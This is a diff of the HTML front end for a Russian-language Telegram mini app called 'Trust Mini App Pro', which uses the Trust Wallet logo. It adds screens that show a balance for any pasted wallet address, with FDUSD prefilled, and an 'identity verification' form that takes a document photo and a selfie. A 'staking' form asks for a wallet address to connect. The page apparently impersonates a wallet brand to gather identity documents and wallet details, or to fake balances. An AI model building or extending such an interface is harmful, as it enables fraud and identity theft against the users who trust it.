@@ -2,114 +2,193 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Trust Wallet Pro</title>
-    <link rel="stylesheet" href="style.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Trust Mini App Pro</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
 </head>
 <body>
-    <div id="app">
-        <!-- ЭКРАН 1: ГЛАВНЫЙ -->
-        <div id="screen-main" class="screen active">
-            <div class="top-bar">Account 1</div>
-            
-            <section class="balance-container">
-                <div class="main-balance">
-                    <span id="total-usd-balance">0,00</span> $
-                    <div class="balance-actions">
-                        <img src="https://img.icons8.com/material-outlined/48/8e8e93/refresh.png" class="mini-icon" id="refresh-indicator">
-                        <img src="https://img.icons8.com/material-outlined/48/8e8e93/settings--v1.png" class="mini-icon" onclick="showScreen('screen-networks')">
-                    </div>
-                </div>
-            </section>
-
-            <nav class="main-tabs">
-                <div class="tabs-left">
-                    <div class="tab active">Crypto</div>
-                    <div class="tab">NFTs</div>
-                    <div class="tab">Approvals</div>
-                </div>
-                <div class="tabs-right">
-                    <img src="https://img.icons8.com/material-outlined/48/8e8e93/horizontal-settings-mixer.png" class="mini-icon">
-                    <img src="https://img.icons8.com/material-outlined/48/8e8e93/history.png" class="mini-icon">
-                </div>
-            </nav>
-
-            <div id="token-list" class="token-list-container">
-                <!-- Сюда будут падать реальные токены из Sui -->
+    <div class="app-container">
+        <!-- Главный экран -->
+        <div id="mainScreen" class="screen active">
+            <div class="header">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Trust_Wallet_logo_%282026%29.png" alt="Logo" class="logo">
+                <button class="settings-btn" id="settingsBtn">⚙️</button>
             </div>
 
-            <div class="manage-link" onclick="showScreen('screen-networks')">Управлять криптовалютами</div>
-
-            <section class="markets-card">
-                <h3>Популярные токены</h3>
-                <div class="card-body">
-                    <div class="card-tabs">
-                        <div class="c-tab active">Top</div>
-                        <div class="c-tab">BNB</div>
-                        <div class="c-tab">ETH</div>
-                        <div class="c-tab">SOL</div>
-                    </div>
-                    <p class="card-subtitle">Топ-5 токенов по общей рыночной капитализации</p>
-                    <div id="popular-list">
-                        <!-- Тут будут BTC, ETH и т.д. -->
-                    </div>
-                </div>
-            </section>
-        </div>
-
-        <!-- ЭКРАН 2: ВЫБОР СЕТИ -->
-        <div id="screen-networks" class="screen">
-            <header class="header-sub">
-                <button class="back-btn" onclick="showScreen('screen-main')">←</button>
-                <h3>Выберите сеть токена</h3>
-            </header>
-            <div class="network-list">
-                <div class="network-item" onclick="selectNetwork('Sui', 'https://cryptologos.cc/logos/sui-sui-logo.png')">
-                    <img src="https://cryptologos.cc/logos/sui-sui-logo.png">
-                    <span>Sui</span>
+            <!-- Карточка баланса -->
+            <div class="card balance-card">
+                <div class="balance-label" data-i18n="main_balance">Основной баланс</div>
+                <div id="totalBalanceDisplay" class="balance-amount">$0.00</div>
+                <button id="manageCryptoBtn" class="manage-btn">
+                    <span data-i18n="manage_crypto">Управлять криптовалютами</span>
                     <span class="arrow">›</span>
+                </button>
+            </div>
+
+            <div class="card tokens-card">
+                <div class="tokens-tabs">
+                    <span class="tab active">Top</span>
+                    <span class="tab">Sui</span>
+                    <span class="tab">ETH</span>
                 </div>
-                <div class="network-item" onclick="selectNetwork('Tron', 'https://cryptologos.cc/logos/tron-trx-logo.png')">
-                    <img src="https://cryptologos.cc/logos/tron-trx-logo.png">
-                    <span>Tron</span>
-                    <span class="arrow">›</span>
+                <div id="tokensList" class="tokens-list">
+                    <div class="loading" data-i18n="loading">Загрузка...</div>
                 </div>
             </div>
         </div>
 
-        <!-- ЭКРАН 3: ДОБАВИТЬ АКТИВ -->
-        <div id="screen-add-token" class="screen">
-            <header class="header-sub">
-                <button class="back-btn" onclick="showScreen('screen-networks')">←</button>
-                <h3>Добавить актив</h3>
-            </header>
-            <div class="add-token-form">
-                <div class="token-logo-preview">
-                    <img id="selected-net-logo" src="">
-                    <p id="selected-net-name"></p>
+        <!-- Экран выбора сети -->
+        <div id="networkSelectScreen" class="screen">
+            <div class="screen-header">
+                <button class="back-btn" id="backFromNetwork">←</button>
+                <h2 data-i18n="select_network">Выбор сети</h2>
+            </div>
+            <div class="card lang-card">
+                <label class="lang-option">
+                    <span>SUI</span>
+                    <input type="radio" name="network" value="sui" checked>
+                </label>
+                <label class="lang-option disabled">
+                    <span>Tron (Скоро)</span>
+                    <input type="radio" name="network" value="tron" disabled>
+                </label>
+                <label class="lang-option disabled">
+                    <span>Ethereum (Скоро)</span>
+                    <input type="radio" name="network" value="eth" disabled>
+                </label>
+                <label class="lang-option disabled">
+                    <span>Solana (Скоро)</span>
+                    <input type="radio" name="network" value="sol" disabled>
+                </label>
+            </div>
+            <button id="nextToImportBtn" class="btn btn-primary" style="margin-top: 20px;" data-i18n="next">Далее</button>
+        </div>
+
+        <!-- Экран импорта токена -->
+        <div id="importTokenScreen" class="screen">
+            <div class="screen-header">
+                <button class="back-btn" id="backFromImport">←</button>
+                <h2 data-i18n="import_token">Импорт токена</h2>
+            </div>
+            <div class="card">
+                <div class="input-group">
+                    <label class="label">Адрес кошелька / Смарт-контракт</label>
+                    <input type="text" id="importAddress" class="text-input" placeholder="0x...">
                 </div>
                 <div class="input-group">
-                    <input type="text" id="input-address" placeholder="Адрес вашего кошелька">
+                    <label class="label">Название</label>
+                    <input type="text" id="importName" class="text-input" value="FDUSD">
                 </div>
                 <div class="input-group">
-                    <label>Название</label>
-                    <input type="text" id="input-name" placeholder="Например, USDT">
+                    <label class="label">Тикер</label>
+                    <input type="text" id="importTicker" class="text-input" value="FDUSD">
                 </div>
                 <div class="input-group">
-                    <label>Тикер</label>
-                    <input type="text" id="input-ticker" placeholder="USDT">
+                    <label class="label">Знаки после запятой</label>
+                    <input type="number" id="importDecimals" class="text-input" value="9">
                 </div>
-                <div class="input-group">
-                    <label>Знаки после запятой</label>
-                    <input type="number" id="input-decimals" value="1">
-                </div>
-                <div class="warning-box">
-                    <span class="warning-icon">⚠️</span>
-                    <p>Обязательно проверьте информацию о токене. Кто угодно может создавать токены.</p>
-                </div>
-                <button class="primary-btn" onclick="saveNewToken()">Добавить токен</button>
+                <button id="confirmImportBtn" class="btn btn-primary" data-i18n="import_action">Импортировать токен</button>
             </div>
         </div>
+
+        <!-- Экран настроек -->
+        <div id="settingsScreen" class="screen">
+            <div class="screen-header">
+                <button class="back-btn" id="backFromSettings">←</button>
+                <h2 data-i18n="settings">Настройки</h2>
+            </div>
+            <!-- Перенесенные разделы -->
+            <div class="card menu-card" id="goToVerifyBtn">
+                <span data-i18n="verify_title">Верификация личности</span>
+                <span class="arrow">›</span>
+            </div>
+            <div class="card menu-card" id="goToStakingBtn">
+                <span data-i18n="staking_title">Стейкинг активов</span>
+                <span class="arrow">›</span>
+            </div>
+            <hr style="border: 0; border-top: 1px solid #eee; margin: 10px 0;">
+            <div class="card menu-card" id="helpBtn">
+                <span data-i18n="help_support">Помощь и поддержка</span>
+                <span class="arrow">›</span>
+            </div>
+            <div class="card menu-card" id="langBtn">
+                <span data-i18n="language">Язык</span>
+                <span class="arrow">›</span>
+            </div>
+        </div>
+
+        <!-- Экран верификации (внутренний) -->
+        <div id="verifyScreen" class="screen">
+            <div class="screen-header">
+                <button class="back-btn" id="backFromVerify">←</button>
+                <h2 data-i18n="verify_title">Верификация</h2>
+            </div>
+            <div class="card">
+                <div class="input-group">
+                    <label class="label" data-i18n="doc_label">Документ</label>
+                    <div class="file-upload-wrapper">
+                        <input type="file" id="docInput" accept="image/*">
+                        <div class="file-custom">
+                            <img id="previewDoc" class="preview-img hidden">
+                            <span id="textDoc" data-i18n="choose_photo">Выбрать фото</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="input-group">
+                    <label class="label" data-i18n="selfie_label">Селфи</label>
+                    <div class="file-upload-wrapper">
+                        <input type="file" id="selfieInput" accept="image/*">
+                        <div class="file-custom">
+                            <img id="previewSelfie" class="preview-img hidden">
+                            <span id="textSelfie" data-i18n="take_photo">Сделать фото</span>
+                        </div>
+                    </div>
+                </div>
+                <button id="verifyBtn" class="btn btn-primary" data-i18n="send_data">Отправить данные</button>
+            </div>
+        </div>
+
+        <!-- Экран стейкинга (внутренний) -->
+        <div id="stakingScreen" class="screen">
+            <div class="screen-header">
+                <button class="back-btn" id="backFromStaking">←</button>
+                <h2 data-i18n="staking_title">Стейкинг</h2>
+            </div>
+            <div class="card">
+                <div class="input-group">
+                    <input type="text" id="walletInput" placeholder="0x..." class="text-input">
+                </div>
+                <button id="stakingBtn" class="btn btn-outline" data-i18n="connect_wallet">Подключить кошелек</button>
+            </div>
+        </div>
+
+        <!-- Остальные экраны (Язык, Помощь, Монета) остаются без изменений -->
+        <div id="helpScreen" class="screen">
+            <div class="screen-header"><button class="back-btn" id="backFromHelp">←</button><h2 data-i18n="help_support">Помощь</h2></div>
+            <div class="card menu-card" id="supportCenterBtn"><span data-i18n="support_center">Центр поддержки</span><span class="arrow">›</span></div>
+        </div>
+
+        <div id="langScreen" class="screen">
+            <div class="screen-header"><button class="back-btn" id="backFromLang">←</button><h2 data-i18n="language">Язык</h2></div>
+            <div class="card lang-card">
+                <label class="lang-option"><span>Русский</span><input type="radio" name="lang" value="ru"></label>
+                <label class="lang-option"><span>English</span><input type="radio" name="lang" value="en"></label>
+            </div>
+        </div>
+
+        <div id="coinScreen" class="screen">
+            <div class="screen-header"><button class="back-btn" id="backFromCoin">←</button><h2 id="coinName">Coin</h2></div>
+            <div class="card coin-main-card">
+                <div class="coin-price-block">
+                    <div id="coinPrice" class="coin-big-price">$0.00</div>
+                    <div id="coinChange" class="coin-change">0.00%</div>
+                </div>
+                <div class="chart-container"><canvas id="coinChartCanvas"></canvas></div>
+            </div>
+        </div>
+
+        <div id="status" class="status-toast hidden"></div>
     </div>
     <script src="script.js"></script>
 </body>
